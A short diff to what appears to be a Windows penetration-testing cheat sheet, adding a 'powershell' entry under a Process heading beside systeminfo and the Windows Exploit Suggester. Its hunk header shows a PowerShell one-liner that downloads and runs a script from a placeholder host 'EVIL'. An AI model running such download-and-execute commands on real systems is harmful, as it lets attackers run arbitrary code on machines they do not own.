@@ -160,6 +160,10 @@ echo IEX (New-Object Net.Webclient).downloadstring('http://EVIL/evil.ps1') | pow
 [Back](#summary)
 
 ## Process
+- powershell
+```
+powershell
+```
 - systeminfo
 	* Gives us system info 
 	* [Offline - Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
